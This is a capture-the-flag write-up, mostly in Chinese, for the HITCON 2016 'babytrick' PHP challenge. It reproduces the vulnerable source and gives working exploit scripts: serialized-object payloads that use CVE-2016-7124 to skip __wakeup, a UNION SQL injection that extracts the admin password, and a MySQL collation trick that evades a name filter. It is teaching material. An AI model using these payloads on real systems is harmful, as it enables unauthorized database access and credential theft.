# Hitcon-2016-babytrick
```php
<?php

include "config.php";

class HITCON{
    private $method;
    private $args;
    private $conn;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;

        $this->__conn();
    }

    function show() {
        list($username) = func_get_args();
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($sql);
        if ( $obj != false  ) {
            $this->__die( sprintf("%s is %s", $obj->username, $obj->role) );
        } else {
            $this->__die("Nobody Nobody But You!");
        }
        
    }

    function login() {
        global $FLAG;

        list($username, $password) = func_get_args();
        $username = strtolower(trim(mysql_escape_string($username)));
        $password = strtolower(trim(mysql_escape_string($password)));

        $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);

        if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
            $this->__die("Orange is so shy. He do not want to see you.");
        }

        $obj = $this->__query($sql);
        if ( $obj != false && $obj->role == 'admin'  ) {
            $this->__die("Hi, Orange! Here is your flag: " . $FLAG);
        } else {
            $this->__die("Admin only!");
        }
    }

    function source() {
        highlight_file(__FILE__);
    }

    function __conn() {
        global $db_host, $db_name, $db_user, $db_pass, $DEBUG;

        if (!$this->conn)
            $this->conn = mysqli_connect($db_host, $db_user, $db_pass);
        mysqli_select_db($this->conn, $db_name);

        if ($DEBUG) {
            $sql = "CREATE TABLE IF NOT EXISTS users ( 
                        username VARCHAR(64), 
                        password VARCHAR(64), 
                        role VARCHAR(64)
                    ) CHARACTER SET utf8";
            $this->__query($sql, $back=false);

            $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";
            $this->__query($sql, $back=false);
        } 

        mysqli_query($this->conn, "SET names utf8");
        mysqli_query($this->conn, "SET sql_mode = 'strict_all_tables'");
    }

    function __query($sql, $back=true) {
        $result = @mysqli_query($this->conn, $sql);
        if ($back) {
            return @mysqli_fetch_object($result);
        }
    }

    function __die($msg) {
        $this->__close();

        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }

    function __close() {
        mysqli_close($this->conn);
    }

    function __destruct() {
        $this->__conn();

        if (in_array($this->method, array("show", "login", "source"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("What do you do?");
        }

        $this->__close();
    }

    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
}

if(isset($_GET["data"])) {
    @unserialize($_GET["data"]);    
} else {
    new HITCON("source", array());
}
```

很容易发现 `show` 函数存在 SQL 注入，因此思路是通过反序列化执行该函数，并传入 SQL 注入语句。

然而 `__wakeup` 函数会对输入进行过滤，无法顺利注入，绕过方法就是 CVE-2016-7124

## CVE-2016-7124
该 CVE 简单说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过 `__wakeup` 的执行。

```php
<?php
class HITCON{
    private $method;
    private $args;
    private $conn=0;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
}

$sql = array("a' union select password,1,1 from users where username='orange'%23");
$pass = new HITCON("show", $sql);
echo urlencode(serialize($pass));
# O%3A6%3A%22HITCON%22%3A3%3A%7Bs%3A14%3A%22%00HITCON%00method%22%3Bs%3A4%3A%22show%22%3Bs%3A12%3A%22%00HITCON%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A79%3A%22orange%27+union+select+password%2C1%2C1+from+users+where+username%3D%27orange%27+limit+1%2C1%23%22%3B%7Ds%3A12%3A%22%00HITCON%00conn%22%3Bi%3A0%3B%7D

# 还需将属性数量增加以绕过 __wakeup 函数，%3A3%3A 中的 3 改大即可
```


## 字符差异绕过限制
得到密码后进行下一步 SQL 注入，但是发现有如下限制
```php
mysqli_query($this->conn, "SET names utf8");
...
if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
    $this->__die("Orange is so shy. He do not want to see you.");
}
```

猪猪侠提到过这样的 tip（MySQL 官方文档也有类似的话）：
> MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。

因此可以利用 Ä 替换 A 来绕过过滤。

```php
<?php
class HITCON{
    private $method;
    private $args;
    private $conn=0;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
}
 
$user['username'] = 'ORÄNGE';
$user['password'] = 'babytrick1234';
$data = new HITCON('login', $user);
echo urlencode(serialize($data));
# O%3A6%3A%22HITCON%22%3A3%3A%7Bs%3A14%3A%22%00HITCON%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00HITCON%00args%22%3Ba%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22OR%C3%84NGE%22%3Bs%3A8%3A%22password%22%3Bs%3A13%3A%22babytrick1234%22%3B%7Ds%3A12%3A%22%00HITCON%00conn%22%3BN%3B%7D%
```

## References
[hitcon-babytrick题目分析与解答](https://blog.spoock.com/2016/11/08/hitcon-babytrick-writeup/)

